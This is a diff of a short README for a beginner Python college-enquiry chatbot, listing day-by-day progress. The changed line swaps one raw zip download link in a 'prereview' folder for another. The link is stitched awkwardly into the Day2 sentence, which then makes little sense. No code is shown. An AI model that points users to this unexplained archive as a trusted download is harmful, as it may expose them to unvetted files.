@@ -1,5 +1,5 @@
 # college-enquiry-chatbot
 day1: a simple python based chatbot for college related quiries.
-Day2: data-driven via https://github.com/harshalcoder2841/college-enquiry-chatbot/raw/refs/heads/main/prereview/chatbot_college_enquiry_roundseam.zip not just if else loops.
+Day2: data-driven via https://github.com/harshalcoder2841/college-enquiry-chatbot/raw/refs/heads/main/prereview/chatbot-college-enquiry-v2.0.zip not just if else loops.
 Day3: better matching + unknowns log.
 Day4: Flask web UI.
